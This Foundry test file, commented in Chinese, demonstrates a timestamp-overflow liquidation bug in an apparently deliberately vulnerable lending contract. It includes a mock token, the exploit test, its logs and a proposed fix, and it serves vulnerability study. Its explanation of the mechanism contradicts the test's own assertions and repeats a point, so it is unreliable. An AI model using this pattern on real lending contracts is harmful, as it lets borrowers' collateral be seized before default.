// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "src/BuggyV1.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// 模拟 DAI 代币合约
contract MockDAI is IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    // 铸造代币的函数
    function mint(address to, uint256 amount) external {
        _balances[to] += amount;
        _totalSupply += amount;
    }

    // 标准 ERC20 接口实现
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _balances[msg.sender] -= amount;
        _balances[to] += amount;
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(_allowances[from][msg.sender] >= amount, unicode"授权额度不足");
        _allowances[from][msg.sender] -= amount;
        _balances[from] -= amount;
        _balances[to] += amount;
        return true;
    }
}

// 漏洞测试合约
contract BuggyV1Test is Test {
    BuggyLendingV1 public lending;
    MockDAI public dai;
    address public lender; // 出借人地址
    address public borrower; // 借款人地址

    function setUp() public {
        // 部署合约
        dai = new MockDAI();
        lending = new BuggyLendingV1(address(dai));

        // 设置角色
        lender = makeAddr("lender");
        borrower = makeAddr("borrower");

        // 设置借贷双方
        lending.setBorrower(borrower);
        lending.setLender(lender);

        // 给借款人铸造 DAI
        dai.mint(borrower, 10_000 * 1e18);

        // 给出借人一些 ETH
        vm.deal(lender, 10 ether);

        // 借款人授权借贷合约使用 DAI
        vm.prank(borrower);
        dai.approve(address(lending), type(uint256).max);
    }

    // 时间逻辑漏洞测试
    function testTimeLogicBug() public {
        // 1. 出借人创建贷款
        vm.prank(lender);
        lending.createLoan{ value: 1 ether }();

        console2.log(unicode"DAI 价格:", lending.DAI_PRICE());

        // 计算所需抵押品
        uint256 loanAmountInETH = 1 ether;
        uint256 requiredCollateralInETH = (loanAmountInETH * lending.LIQUIDATION_THRESHOLD()) / 100;
        uint256 requiredCollateralInDAI = requiredCollateralInETH * 3500;

        console2.log(unicode"计算详情:");
        console2.log(unicode" - 贷款金额 (ETH):", loanAmountInETH);
        console2.log(unicode" - 所需抵押品 (ETH):", requiredCollateralInETH);
        console2.log(unicode" - 所需抵押品 (DAI):", requiredCollateralInDAI);

        // 添加安全边际
        uint256 collateralWithMargin = requiredCollateralInDAI * 12 / 10; // 增加 20% 边际
        console2.log(unicode" - 含边际的抵押品 (DAI):", collateralWithMargin);

        // 验证 DAI 余额充足
        require(collateralWithMargin <= dai.balanceOf(borrower), unicode"DAI 余额不足");

        // 设置初始时间戳
        vm.warp(1000);

        // 2. 借款人提供抵押并借款
        vm.prank(borrower);
        lending.borrowLoan(collateralWithMargin);

        // 3. 检查贷款是否可以被清算（此时不应该可以清算）
        bool canLiquidateBeforeDefault = lending.canLiquidate();
        assertFalse(canLiquidateBeforeDefault, unicode"贷款不应该可以被清算");

        // 打印贷款详情
        (,, uint256 startTime, uint256 dueDate,,) = lending.activeLoan();
        console2.log(unicode"贷款详情:");
        console2.log(unicode" - 开始时间:", startTime);
        console2.log(unicode" - 到期时间:", dueDate);
        console2.log(unicode" - 当前时间:", block.timestamp);

        // 4. 调整时间以触发时间逻辑漏洞
        // 由于 canLiquidate() 中的漏洞: block.timestamp + dueDate > startTime
        // 我们需要设置一个会导致溢出的时间戳
        uint256 newTimestamp;
        unchecked {
            // 计算一个会导致与 dueDate 相加时溢出的时间戳
            newTimestamp = type(uint256).max - dueDate + 1;
        }
        vm.warp(newTimestamp);

        console2.log(unicode"时间调整后:");
        console2.log(unicode" - 当前时间:", block.timestamp);
        console2.log(unicode" - 开始时间:", startTime);
        console2.log(unicode" - 到期时间:", dueDate);

        // 检查贷款是否可以被清算（由于时间漏洞，现在应该可以清算）
        bool canLiquidateAfterTimeWarp = lending.canLiquidate();
        assertTrue(canLiquidateAfterTimeWarp, unicode"由于时间漏洞，贷款应该可以被清算");

        // 5. 尝试清算
        vm.prank(lender);
        lending.liquidate();

        // 6. 检查清算后的贷款状态
        (,,,, bool isActive,) = lending.activeLoan();
        assertFalse(isActive, unicode"贷款应该已被清算");

        // 打印最终余额
        console2.log(unicode"清算后出借人的 DAI 余额:", dai.balanceOf(lender));
    }
}


/**

Logs:
  DAI 价格: 285714285714285
  计算详情:
   - 贷款金额 (ETH): 1000000000000000000
   - 所需抵押品 (ETH): 1500000000000000000
   - 所需抵押品 (DAI): 5250000000000000000000
   - 含边际的抵押品 (DAI): 6300000000000000000000
  贷款详情:
   - 开始时间: 1000
   - 到期时间: 1729000
   - 当前时间: 1000
  时间调整后:
   - 当前时间: 115792089237316195423570985008687907853269984665640564039457584007913127910936
   - 开始时间: 1000
   - 到期时间: 1729000
  清算后出借人的 DAI 余额: 6300000000000000000000


DAI 价格: 285714285714285 (约等于 1 ETH = 3500 DAI)
贷款金额: 1 ETH = 1000000000000000000 wei
所需抵押品: 1.5 ETH (150% 抵押率)
所需 DAI 抵押品: 5250 DAI (1.5 ETH * 3500 DAI/ETH)
实际提供抵押品: 6300 DAI (增加 20% 安全边际)


初始状态:
- 开始时间: 1000
- 到期时间: 1729000 (开始时间 + 20天)
- 当前时间: 1000

调整后:
- 当前时间: 2^256 - dueDate + 1
- 当 block.timestamp + dueDate 计算时会发生溢出
- 溢出后的结果会大于 startTime，触发清算条件

清算后出借人获得全部抵押品: 6300 DAI
借款人失去抵押品但保留了借到的 1 ETH


这个漏洞的本质是：
1. 合约在检查贷款是否违约时使用了有问题的时间比较逻辑
2. 通过设置特定的 block.timestamp，可以导致时间计算溢出
3. 溢出后的结果会满足清算条件
4. 溢出后的结果会满足清算条件
5. 允许贷款在未到期时被清算，导致借款人损失过多抵押品
攻击者可以在贷款刚创建时就触发清算
借款人会在未违约的情况下失去抵押品
清算人可以获取未应该被清算的抵押品

修复方法是将时间检查改为：
bool isDefaulted = block.timestamp > dueDate;
 */